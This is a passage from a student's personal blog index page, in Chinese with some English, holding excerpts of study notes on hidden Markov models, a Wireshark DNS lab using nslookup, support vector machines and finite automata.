A = \begin{bmatrix}
    a_{11} &amp; a_{12} &amp; \cdots &amp; a_{1n} \\
    a_{21} &amp; a_{22} &amp; \cdots &amp; a_{2n} \\
    \vdots &amp; \vdots &amp; \ddots &amp; \vdots \\
    a_{n1} &amp; a_{n2} &amp; \cdots &amp; a_{nn}
\end{bmatrix}
$$
然后我们假设这个马尔可夫链有$n$个状态:
$$
Q = \{q_1, q_2, \cdots, q_n\}
$$
然后我们实际观察到的结果由当前状态来决定, 但是状态对我们而言是不可见的, 所以被称为隐马尔可夫, 而为了得到我们观测的结果, 我们可以得到一个**观测概率矩阵**:
$$
B = \begin{bmatrix}
    b_{q_1}(1) &amp; b_{q_1}(2) &amp; \cdots &amp; b_{q_1}(m) \\
    b_{q_2}(1) &amp; b_{q_2}(2) &amp; \cdots &amp; b_{q_2}(m) \\
    \vdots &amp; \vdots &amp; \ddots &amp; \vdots \\
    b_{q_n}(1) &amp; b_{q_n}(2) &amp; \cdots &amp; b_{q_n}(m)
\end{bmatrix}
$$
表示在某个状态下出现某个观测值的概率

最后我们还需要一个初始状态概率向量:
$$
\pi = \begin{bmatrix}
    \pi_1 \\
    \pi_2 \\
    \vdots \\
    \pi_n
\end{bmatrix}
$$

然后我们就有了一个完整的隐马尔可夫模型

根据`统计机器学习`中对隐马尔可夫模型的说明, 相关问题可以分为三类:

#### 概率计算问题
假设我们已知模型$\lambda = (A, B, \pi)$, 以及观测序列$O = o_1, o_2, \cdots, o_T$, 我们要计算观测序列在这个模型下出现的概率

我们有前向算法和后向算法:

- 前向算法: 
    从初始状态出发, 逐步向后推进, 直到最后一个状态, 然后计算最后一个状态的概率
    设下式:
    $$
    \begin{aligned}
    \alpha_t(i) &amp; = P(o_1, o_2, \cdots, o_t, q_t = q_i | \lambda)
    \end{aligned}
    $$
    表示到$t$时刻, 状态为$q_i$且观测到$O_1, O_2, \cdots, O_t$的概率
    那么我们可以得到递推式:
    $$
    \begin{aligned}
    \alpha_1(i) &amp; = \pi_i b_i(o_1) \\
    \alpha_{t+1}(j) &amp; = \sum_{i=1}^n \alpha_t(i) a_{ij} b_j(o_{t+1})
    \end{aligned}
    $$
    表示从前向后概率概率的累乘相加(加法原理+乘法原理)

- 后向算法:
    从最后一个状态出发, 逐步向前推进, 直到初始状态, 然后计算初始状态的概率
    设下式:
    $$
    \begin{aligned}
    \beta_t(i) &amp; = P(o_{t+1}, o_{t+2}, \cdots, o_T | q_t = q_i, \lambda)
    \end{aligned}
    $$
    表示从$T$时刻开始, 状态为$q_i$且观测到$O_{t+1}, O_{t+2}, \cdots, O_T$的概率
    那么我们可以得到递推式:
    $$
    \begin{aligned}
    \beta_T(i) &amp; = 1 \\
    \beta_{t-1}(i) &amp; = \sum_{j=1}^n a_{ij} b_j(o_t) \beta_t(j)
    \end{aligned}
    $$
    设每一个最终状态的概率为$1$, 从每一个状态向前推, 直到初始状态:
    $$
    \begin{aligned}
    P(O | \lambda) &amp; = \sum_{i=1}^n \pi_i b_i(o_1) \beta_1(i)
    \end{aligned}
    $$

#### 学习问题

学习分为监督学习和无监督学习

对于监督学习使用极大似然法来计算:
$$
a_{ij} = \frac{A_{ij}}{\sum_{j=1}^{N}A_{ij}}
$$
表示从$i$转移到$j$在从$i$转移到任何状态的概率中所占的比例

$$
b_j(k) = \frac{B_{jk}}{\sum_{k=1}^{M}B_{jk}}
$$
表示在状态$j$下观测到$k$的概率

$$
\pi_i = \frac{初始状态为q_i的样本数}{样本总数}
$$

---

对于无监督学习, 使用EM算法, 状态序列$Q = q_1, q_2, \cdots, q_T$, 观测序列$O = o_1, o_2, \cdots, o_T$, 隐马尔可夫模型$\lambda = (A, B, \pi)$, 我们已知观测序列, 将状态序列视作未观测量, 通过EM算法来估计模型参数

推导过程略去, 我们直接记无监督学习算法如下:

$$
\begin{aligned}
a_{ij} &amp;= \frac{\sum_{t=1}^{T-1} \zeta_t(i, j)}{\sum_{t=1}^{T-1} \gamma_t(i)} \\
b_j(k) &amp;= \frac{\sum_{t=1}^{T} \gamma_t(j)}{\sum_{t=1}^{T} \gamma_t(j)} \\
\pi_i &amp;= \gamma_1(i)
\end{aligned}
$$
其中:
$$
\begin{aligned}
\gamma_t(i) &amp; = P(q_t = q_i | O, \lambda) \\
&amp; = \frac{\alpha_t(i) \beta_t(i)}{P(O | \lambda)} \\
&amp; = \frac{\alpha_t(i) \beta_t(i)}{\sum_{j=1}^{N} \alpha_t(j)\beta_t(j)} \\
\end{aligned}
$$
$\alpha_t(i)$和$\beta_t(i)$分别表示前向概率和后向概率, $\gamma_t(i)$表示在时刻$t$处于状态$i$的概率

$$
\begin{aligned}
\zeta_t(i, j) &amp; = P(q_t = q_i, q_{t+1} = q_j | O, \lambda) \\
&amp; = \frac{\alpha_t(i) a_{ij} b_j(o_{t+1}) \beta_{t+1}(j)}{P(O | \lambda)} \\
&amp; = \frac{\alpha_t(i) a_{ij} b_j(o_{t+1}) \beta_{t+1}(j)}{\sum_{i=1}^{N} \sum_{j=1}^{N} \alpha_t(i) a_{ij} b_j(o_{t+1}) \beta_{t+1}(j)} \\
\end{aligned}
$$
$\zeta_t(i, j)$表示在时刻$t$处于状态$i$且在时刻$t+1$处于状态$j$的概率

---

隐马尔可夫和EM算法看了两天看麻了, 就这样吧
      </span>
    </div>
  </div>

  <div class="card-img">
    <div class="img-container"></div>
  </div>

</div>



  
  
  
<div class="card" style="justify-content: right;">

  <div class="card-img">
    <div class="img-container"></div>
  </div>

  <div class="card-content">
    <div class="card-info-warp">
      <div class="card-info">
        2023-03-17
      </div>
      <div class="card-info">
        3.7k字
      </div>
      <div class="card-info">
        阅读时间: 3 mins.
      </div>
    </div>
    <div style="display: flex;">
      <svg xmlns="http://www.w3.org/2000/svg" width="392" height="2" viewBox="0 0 392 2" fill="none">
        <path d="M0 1L392 1.00003" stroke="#A5BFF2" />
      </svg>
    </div>
    <a class="card-title" href="/2023/03/17/network/works-projects/wireShark-3/">
      wireshark practice 3 - DNS
    </a>
    <span class="card-abstract">
      
1. Run nslookup to obtain the IP address of a Web server in Asia. What is the IP address of that server?

```
nslookup www.baidu.com
Server:  UnKnown
Address:  10.3.9.44

Non-authoritative answer:
Name:    www.a.shifen.com
Addresses:  39.156.66.14
          39.156.66.18
Aliases:  www.baidu.com
```

2. Run nslookup to determine the authoritative DNS servers for a university in Europe.

```
nslookup -type=NS bupt.edu.cn
Server:  UnKnown
Address:  10.3.9.44

Non-authoritative answer:
bupt.edu.cn     nameserver = ns.buptnet.edu.cn
bupt.edu.cn     nameserver = gus.buptnet.edu.cn
```

3. Run nslookup so that one of the DNS servers obtained in Question 2 is queried for the mail servers for Yahoo! mail.   What is its IP address?

```
nslookup www.baidu.com ns.buptnet.edu.cn
Server:  UnKnown
Address:  2001:da8:202:10::37
```

国内没有yahoo, 用百度代替

---
这一部分使用wireshark进行抓包分析

4. Locate the DNS query and response messages. Are then sent over UDP or TCP?

```
UDP
```

5. What is the destination port for the DNS query message? What is the source port of DNS response message?

```
Source Address: 10.21.180.15
Destination Address: 10.3.9.44
```

6. To what IP address is the DNS query message sent? Use ipconfig to determine the IP address of your local DNS server. Are these two IP addresses the same?

```
DNS Servers . . . . . . . . . . . : 10.3.9.44 //the same
                                    10.3.9.45
```

7. Examine the DNS query message. What “Type” of DNS query is it? Does the query message contain any “answers”?

```
一些是A类型, 一些是AAAA类型查询
在response中的类型可能包含一些CNAME类型, 这是域名的别名
```

8. Examine the DNS response message. How many “answers” are provided? What do each of these answers contain?

```
有些提供两个有些提供三个, 其中包含两个不同的DNS地址和一个CNAME别名
```

---

9. Consider the subsequent TCP SYN packet sent by your host. Does the destination  IP address of the SYN packet correspond to any of the IP addresses provided in the DNS response message?

```
一样的, 但是发送的双方都使用的是ipv6地址, 导致之前使用IPV4地址过滤时查不到
```

10. This web page contains images. Before retrieving each image, does your host issue new DNS queries? 

```
后面确实还有一些DNS查询, 但是看起来并不是为了获取图片而进行的
图片的请求应该使用的QUIC协议, 并且内容受到保护的样子
```

---

下面是对nslookup的抓包:

11.	What is the destination port for the DNS query message? What is the source port of DNS response message?

```
both are 53
```

12.	To what IP address is the DNS query message sent? Is this the IP address of your default local DNS server?

```
yes, it is 10.3.9.44
```

13.	Examine the DNS query message. What “Type” of DNS query is it? Does the query message contain any “answers”?

```
Type is A and AAAA, and it contains some answers
```

14.	Examine the DNS response message. How many “answers” are provided? What do each of these answers contain?

```
it contains three answers, two of them are CNAME and one is A
```

15.	Provide a screenshot.
```
no way
```

---

16.	To what IP address is the DNS query message sent? Is this the IP address of your default local DNS server?

```
学校的dns查不到mit的域名, 所以使用google的公共DNS做替代:
2001:4860:4860::8888
显然不是我的默认DNS服务器
```

17.	Examine the DNS query message. What “Type” of DNS query is it? Does the query message contain any “answers”?

```
当然是NS类型, nslookup的参数设定里就是这么查询的
```

18.	Examine the DNS response message. What MIT nameservers does the response message provide? Does this response message also provide the IP addresses of the MIT namesers?

```
Only provide the name of the MIT nameservers, not the IP addresses
```

19.	Provide a screenshot.
```
no way
```

最后三个差不多, 就不做了

    </span>

  </div>

</div>



  
  
  

<div class="card" style="justify-content: left;">

  <div class="card-content">

    <div class="card-info-warp">
      <div class="card-info">
        2023-03-13
      </div>
      <div class="card-info">
        1.3k字
      </div>
      <div class="card-info">
        阅读时间: 1 mins.
      </div>
    </div>
    <div style="display: flex;">
      <svg xmlns="http://www.w3.org/2000/svg" width="392" height="2" viewBox="0 0 392 2" fill="none">
        <path d="M0 1L392 1.00003" stroke="#A5BFF2" />
      </svg>
    </div>
    <div style="transform: translateX(10px);">
      <a class="card-title" href="/2023/03/13/ML/SVM/">
        支持向量机
      </a>
      <span class="card-abstract" style="transform: translateX(0px);">
        
# 支持向量机(SVM)

支持向量机是一个二分类的监督学习算法, 它的目标是找到一个超平面, 使得超平面两侧的点到超平面的距离都尽可能的远, 从而使得超平面两侧的点尽可能的分开

一个超平面我们可以用下式来表示:
$$
w^Tx + b = 0
$$
其中, $w$ 是超平面的法向量, $b$ 是超平面的截距, $x$ 是描述点位置的向量

如果以一个二维超平面(直线)为例子, 可以如下表示:
$$
w^T = \begin{bmatrix} w_1 \\ w_2 \end{bmatrix}, x = \begin{bmatrix} x_1 \\ x_2 \end{bmatrix}, 
b = constant \\
\space \\
w_1x_1 + w_2x_2 + b = 0
$$

![](http://shouce.jb51.net/dm-algo/img/20140502163842531.jpg)

上图描述了一个SVM将数据分为两半的图像, 用两条平行的二维超平面分开, 我们让SVM划分区域的超平面为互相平行的, 也就是说$w$相等, 参考平行直线的距离公式:
$$
d = \frac{|b_1 - b_2|}{\sqrt{w_1^2 + w_2^2}}
$$
我们得到任意平行超平面距离公式为:
$$
d = \frac{|b_1 - b_2|}{||w||}
$$
其中, $||w||$ 是$w$的模, 也就是$w$的长度
为了使$d$最大, 我们的最优化任务就是使得$||w||$最小

所以我们的任务就是找到两个平行的超平面, 使得所有数据都在它们的两边, 并且这两个超平面之间的距离最大

使得所有数据都在其两边是这个优化问题的约束条件, 可以用不等式表示如下:
$$
y_i(w^Tx_i + b) \geq 1
$$

具体解释一下这个式子:
如果我们把一个不是直线上的点带入直线, 得到的值是什么?
比如:
$$
y = -\frac{1}{2}x + 1
$$
我们带入$(0,0)$和$(1,1)$, 得到的结果是$-1$和$\frac{1}{2}$, 两者相对直线的距离的比例和方向都体现出来了, 同时发现计算出的值除以$||w||$就是实际上的相差距离

所以我们带入$x_i$的式子:
$$
w^Tx_i + b \geq 1 \\
w^Tx_i + b \leq -1 
$$
这里的$1$表示的就是距离为$\frac{1}{||w||}$的两条边界两边

于是我们有原初(primal)的优化问题如下:
$$
\begin{aligned}
\min_{w,b} &amp; \frac{1}{2}||w||^2 \\
s.t. &amp; y_i(w^Tx_i + b) \geq 1
\end{aligned}
$$

      </span>
    </div>
  </div>

  <div class="card-img">
    <div class="img-container"></div>
  </div>

</div>



  
  
  
<div class="card" style="justify-content: right;">

  <div class="card-img">
    <div class="img-container"></div>
  </div>

  <div class="card-content">
    <div class="card-info-warp">
      <div class="card-info">
        2023-03-13
      </div>
      <div class="card-info">
        845字
      </div>
      <div class="card-info">
        阅读时间: 1 mins.
      </div>
    </div>
    <div style="display: flex;">
      <svg xmlns="http://www.w3.org/2000/svg" width="392" height="2" viewBox="0 0 392 2" fill="none">
        <path d="M0 1L392 1.00003" stroke="#A5BFF2" />
      </svg>
    </div>
    <a class="card-title" href="/2023/03/13/automata-theory/CH3-DFA/">
      有穷状态自动机
    </a>
    <span class="card-abstract">
      
# 有穷状态自动机(FA)

关于这一节, 如果不用严格的证明表述的话还是很好理解的

## 什么是自动机, 为什么要有自动机?
这里所说的自动机可以看作对语言的形式化理解(对字符串进行理解)

我们在很多地方都有用到自动机的理论, 比如数字电路中的时序电路, 我们常用状态转移图来表示一个电路状态根据输入的变化.

自动机理论则是将这种状态, 状态转移, 语言的概念进行抽象, 总结出来的理论

### FA的定义
一个FA是一个五元组$(Q, \Sigma, \delta, q_0, F)$来定义的, 其中:
- $Q$是一个有穷集合, 称为状态集合, 代表自动机的状态空间
- $\Sigma$是一个有穷集合, 称为输入符号集合, 是我们识别串的字母表
- $\delta$是一个从$Q\times\Sigma$到$Q$的映射, 称为状态转移函数, 代表状态转移的规则, 自动机在某个状态$q$下如果读入字母(句子)$a$则会改变自身状态
- $q_0$表示开始状态
- $F$表示结束状态的集合

除了用符号语言表达外我们还可以用图形(状态转移图)来表示:

```Mermaid
stateDiagram
    direction LR
    [*] --&gt; q0                                                              
    q0 --&gt; q1 : 1
    q0 --&gt;q0 : 0
    q0 --&gt;q2 : 2
    q1 --&gt; q3:ε
    q3 --&gt; q2: 1
    q2 --&gt; q1: 0
    q2 --&gt; [*]: 1
```
    </span>

  </div>

</div>



  
</div>



<div id="paginator">
  <a class="extend prev" rel="prev" href="/page/3/">Prev</a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><span class="page-number current">4</span><a class="page-number" href="/page/5/">5</a><a class="page-number" href="/page/6/">6</a><span class="space">&hellip;</span><a class="page-number" href="/page/16/">16</a><a class="extend next" rel="next" href="/page/5/">Next</a>
</div>
    </div>

  </div>



  
  <!-- scripts list from theme config.yml -->
  
  <script src="/js/layout/animation.js"></script>
  
  <script src="/js/layout/svg.js"></script>
  
  <script src="/js/csstool.js"></script>
  
  

</body>

</html>